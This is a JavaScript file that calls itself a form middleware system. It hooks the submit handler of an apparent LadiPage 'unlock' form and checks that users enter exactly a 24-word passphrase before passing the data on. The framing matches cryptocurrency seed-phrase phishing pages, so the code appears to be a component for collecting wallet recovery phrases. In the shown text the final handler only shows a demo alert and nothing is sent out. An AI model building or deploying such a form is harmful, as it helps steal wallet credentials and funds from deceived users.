/**
 * Form Middleware System
 * This file provides a middleware system for form submissions
 * It allows you to execute functions before the form submission handler runs
 * Vanilla JavaScript implementation - no jQuery required
 */

// Create a middleware system for form submission
const formMiddleware = {
    middlewares: [],
    
    // Add a new middleware function
    use: function(fn) {
        this.middlewares.push(fn);
        return this; // For chaining
    },
    
    // Execute all middleware functions
    execute: function(event, next) {
        let index = 0;
        
        // Function to call the next middleware
        const executeNext = () => {
            if (index < this.middlewares.length) {
                const middleware = this.middlewares[index];
                index++;
                // Call the middleware with the event and next function
                middleware(event, executeNext);
            } else {
                // All middlewares executed, call the final callback
                next();
            }
        };
        
        // Start executing middlewares
        executeNext();
    }
};

// Initialize the form middleware for unlock form
const unlockFormMiddleware = Object.create(formMiddleware);

// Middleware: Extract form data
unlockFormMiddleware.use(function(event, next) {
    console.log('Middleware 1: Extracting form data');
    event.preventDefault(); // Ngăn reload form mặc định

    const form = event.target;
    const formData = new FormData(form);

    const data = {};
    formData.forEach((value, key) => {
        data[key] = value.trim();
    });

    // Attach formData object to event
    event.formData = data;

    console.log('Form data:', data);
    next();
});

// Middleware: Validate passphrase format
unlockFormMiddleware.use(function(event, next) {
    console.log('Middleware 2: Validating passphrase');

    const passphrase = event.formData?.message || '';

    if (!passphrase) {
        alert('Please enter your 24-word passphrase');
        return;
    }

    const words = passphrase.split(/\s+/);
    if (words.length !== 24) {
        alert('Passphrase must contain exactly 24 words');
        return;
    }

    next();
});

// Flag to track if middleware has already been executed for this submission
let middlewareExecuting = false;

// Wait for DOM to be fully loaded
// Wait for DOM to be fully loaded
document.addEventListener('DOMContentLoaded', function() {
    console.log('Setting up form middleware => v4');
    
    // Lấy form theo class mới
    const unlockForm = document.querySelector('.ladi-form');
    
    if (unlockForm) {
        const originalAddEventListener = Element.prototype.addEventListener;
        
        unlockForm.addEventListener = function(type, listener, options) {
            if (type === 'submit') {
                console.log('Intercepting submit event binding');
                
                const wrappedListener = function(event) {
                    if (middlewareExecuting) return;
                    
                    middlewareExecuting = true;
                    console.log('Form submission intercepted by middleware');
                    
                    unlockFormMiddleware.execute(event, function() {
                        console.log('All middlewares completed, proceeding with original handler');
                        listener.call(unlockForm, event);
                        setTimeout(() => { middlewareExecuting = false; }, 100);
                    });
                };
                
                return originalAddEventListener.call(this, type, wrappedListener, options);
            }
            
            return originalAddEventListener.call(this, type, listener, options);
        };

        // Handler cuối cùng (ví dụ demo)
        unlockForm.addEventListener('submit', function(event) {
            const data = event.formData;
            console.log('Final handler received data:', data);

            alert("Form submitted!\n" + JSON.stringify(data, null, 2));
        });
    }
});


console.log('Form middleware system initialized');
